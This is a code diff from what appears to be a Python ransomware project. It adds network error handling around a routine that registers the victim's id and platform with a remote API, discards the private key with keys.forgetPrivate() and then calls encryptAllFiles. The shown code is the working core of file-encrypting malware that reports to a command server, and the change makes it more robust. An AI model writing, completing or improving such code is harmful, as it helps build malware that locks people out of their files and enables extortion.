@@ -10,6 +10,7 @@ import uuid
 import Config
 import json
 import os
+import requests
 from pathlib import Path
 from Helper import Helper
 from FileCrypter import FileCrypter
@@ -79,11 +80,16 @@ def genKeyPair():
         'platform': os_info
     }
     headers = {'Content-type': 'application/json', 'Accept': 'text/plain'}
-    req = _session.post(Config.API_URL + "/users/add", data=json.dumps(data), headers=headers)
-    _helper.debug("Got Response from /users/add => " + str(req.json()))
-    keys.forgetPrivate()
-    encryptAllFiles(keys)
-    return unique_id
+    try:
+        req = _session.post(Config.API_URL + "/users/add", data=json.dumps(data), headers=headers)
+        _helper.debug("Got Response from /users/add => " + str(req.json()))
+        keys.forgetPrivate()
+        encryptAllFiles(keys)
+        return unique_id
+    except requests.exceptions.RequestException:
+        _helper.safe_exit()
+    except requests.exceptions.ConnectionError:
+        _helper.safe_exit()
 
 def encryptAllFiles(keys):
     pathlist = []
